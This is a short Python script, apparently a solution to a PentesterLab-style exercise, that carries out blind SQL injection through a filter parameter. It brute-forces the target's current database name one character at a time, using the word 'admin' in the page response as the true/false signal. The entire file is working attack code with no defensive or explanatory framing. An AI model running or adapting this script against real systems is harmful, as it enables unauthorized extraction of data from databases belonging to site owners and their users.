import requests
import string
import sys

def main():
    url = "http://ptl-9c26cc88-d1cdb001.libcurl.so/?filter[{0}]={1}"
    print("Obtain the database")
    get_current_database(url)

def get_current_database(base_url):
    base_query = "substring(current_database(),{0},1)"
    for i in range(1,100):
        query = base_query.format(i)
        for l in string.printable:
            # print(query)
            # print(l)
            url = base_url.format(query, l)
            if check_valid(url):
                sys.stdout.write(l)
                sys.stdout.flush()
                break

def check_valid(url):
    # print(f"Request to {url}")
    res = requests.get(url)
    return "admin" in res.text

if __name__ == "__main__":
    main()